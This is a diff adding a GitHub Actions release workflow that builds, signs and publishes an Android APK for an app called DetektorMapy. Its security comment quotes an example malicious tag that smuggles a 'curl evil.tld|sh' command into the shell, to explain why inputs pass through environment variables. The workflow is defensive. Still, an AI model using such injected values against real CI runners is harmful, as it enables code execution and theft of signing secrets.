@@ -1,0 +1,188 @@
+name: Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Tag pro release (napr. v0.1.0) - musi uz existovat v repu'
+        required: true
+        type: string
+
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    name: Build and publish release APK
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    steps:
+      # Untrusted input goes through env, never through ${{ }} interpolation into the shell:
+      # a tag like  v1.0"; curl evil.tld|sh; #  would otherwise execute on the runner, which
+      # here holds the APK signing secrets.
+      - name: Resolve tag
+        id: tag
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            TAG="$INPUT_TAG"
+          else
+            TAG="${GITHUB_REF#refs/tags/}"
+          fi
+          case "$TAG" in
+            v[0-9]*) ;;
+            *) echo "Odmítám tag [$TAG] — očekávám tvar vX.Y.Z" >&2; exit 1 ;;
+          esac
+          echo "tag=${TAG}" >> "$GITHUB_OUTPUT"
+          echo "version=${TAG#v}" >> "$GITHUB_OUTPUT"
+          echo "Release tag: ${TAG}"
+
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ steps.tag.outputs.tag }}
+          fetch-depth: 0
+
+      # Same reason as in ci.yml: gradle.properties pins org.gradle.java.home to a
+      # local macOS path from the developer machine (handoff.md). It must not leak
+      # into the runner, which gets JDK 21 from actions/setup-java instead.
+      - name: Neutralise local org.gradle.java.home
+        run: sed -i '/org.gradle.java.home/d' gradle.properties
+
+      - name: Set up JDK 21 (Temurin)
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+
+      # The wrapper jar is committed, so verify it against Gradle's published checksums
+      # before executing it — especially in release, where it runs with signing secrets.
+      - name: Validate Gradle wrapper
+        uses: gradle/actions/wrapper-validation@v4
+
+      - name: Set up Gradle
+        uses: gradle/actions/setup-gradle@v4
+
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Make gradlew executable
+        run: chmod +x ./gradlew
+
+      # Signing secrets (PLAN.md, section 7): SIGNING_KEY_BASE64, STORE_PASSWORD,
+      # KEY_ALIAS, KEY_PASSWORD. When SIGNING_KEY_BASE64 is missing we still produce
+      # an installable-but-unsigned APK instead of failing the whole release.
+      - name: Decode keystore
+        id: keystore
+        env:
+          SIGNING_KEY_BASE64: ${{ secrets.SIGNING_KEY_BASE64 }}
+        run: |
+          if [ -z "${SIGNING_KEY_BASE64}" ]; then
+            echo "signed=false" >> "$GITHUB_OUTPUT"
+            echo "::warning::SIGNING_KEY_BASE64 neni nastaveny - buduji NEPODEPSANY release APK."
+            exit 0
+          fi
+          KEYSTORE_PATH="${RUNNER_TEMP}/detektormapy-release.jks"
+          printf '%s' "${SIGNING_KEY_BASE64}" | base64 --decode > "${KEYSTORE_PATH}"
+          if [ ! -s "${KEYSTORE_PATH}" ]; then
+            echo "::error::Dekodovany keystore je prazdny - zkontroluj secret SIGNING_KEY_BASE64."
+            exit 1
+          fi
+          chmod 600 "${KEYSTORE_PATH}"
+          echo "signed=true" >> "$GITHUB_OUTPUT"
+          echo "keystore_path=${KEYSTORE_PATH}" >> "$GITHUB_OUTPUT"
+
+      # Env var names are dictated by app/build.gradle.kts, which reads the release
+      # signingConfig purely from the environment.
+      - name: Build signed release APK
+        if: steps.keystore.outputs.signed == 'true'
+        env:
+          SIGNING_KEYSTORE_PATH: ${{ steps.keystore.outputs.keystore_path }}
+          SIGNING_STORE_PASSWORD: ${{ secrets.STORE_PASSWORD }}
+          SIGNING_KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
+          SIGNING_KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
+        run: ./gradlew assembleRelease --stacktrace
+
+      - name: Build unsigned release APK
+        if: steps.keystore.outputs.signed != 'true'
+        run: ./gradlew assembleRelease --stacktrace
+
+      - name: Collect APK
+        id: apk
+        run: |
+          TAG="${{ steps.tag.outputs.tag }}"
+          APK="$(find app/build/outputs/apk/release -name '*.apk' -print -quit)"
+          if [ -z "${APK}" ]; then
+            echo "::error::Zadny APK v app/build/outputs/apk/release."
+            exit 1
+          fi
+          mkdir -p dist
+          if [ "${{ steps.keystore.outputs.signed }}" = "true" ]; then
+            OUT="dist/DetektorMapy-${TAG}.apk"
+          else
+            OUT="dist/DetektorMapy-${TAG}-unsigned.apk"
+          fi
+          cp "${APK}" "${OUT}"
+          echo "path=${OUT}" >> "$GITHUB_OUTPUT"
+          echo "sha256=$(sha256sum "${OUT}" | cut -d' ' -f1)" >> "$GITHUB_OUTPUT"
+          ls -l "${OUT}"
+
+      - name: Extract release notes from CHANGELOG.md
+        id: notes
+        run: |
+          TAG="${{ steps.tag.outputs.tag }}"
+          VERSION="${{ steps.tag.outputs.version }}"
+          NOTES_FILE="${RUNNER_TEMP}/release-notes.md"
+          if [ -f CHANGELOG.md ]; then
+            awk -v ver="${VERSION}" '
+              $0 ~ "^## \\[" ver "\\]" { grab = 1; next }
+              grab && /^## / { exit }
+              grab { print }
+            ' CHANGELOG.md > "${NOTES_FILE}"
+          fi
+          if [ ! -s "${NOTES_FILE}" ]; then
+            echo "Pro verzi ${VERSION} nebyla v CHANGELOG.md nalezena sekce. Viz historie commitu." > "${NOTES_FILE}"
+          fi
+          {
+            echo ""
+            echo "---"
+            echo ""
+            if [ "${{ steps.keystore.outputs.signed }}" = "true" ]; then
+              echo "APK je podepsane release klicem projektu."
+            else
+              echo "**POZOR: toto je NEPODEPSANE sestaveni.** Chybely podpisove secrets"
+              echo "(\`SIGNING_KEY_BASE64\`). APK nelze bez podepsani nainstalovat"
+              echo "standardnim sideloadem - pouzij ho jen pro testovani."
+            fi
+            echo ""
+            echo "SHA-256: \`${{ steps.apk.outputs.sha256 }}\`"
+            echo ""
+            echo "Instalace: stahni APK do telefonu a nainstaluj sideloadem, nebo pridej"
+            echo "repozitar do aplikace Obtainium pro automaticke aktualizace."
+          } >> "${NOTES_FILE}"
+          echo "file=${NOTES_FILE}" >> "$GITHUB_OUTPUT"
+          cat "${NOTES_FILE}"
+
+      - name: Publish GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ steps.tag.outputs.tag }}
+          name: >-
+            DetektorMapy ${{ steps.tag.outputs.tag }}${{ steps.keystore.outputs.signed == 'true' && '' || ' (nepodepsano)' }}
+          body_path: ${{ steps.notes.outputs.file }}
+          files: ${{ steps.apk.outputs.path }}
+          draft: false
+          prerelease: ${{ steps.keystore.outputs.signed != 'true' }}
+          fail_on_unmatched_files: true
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
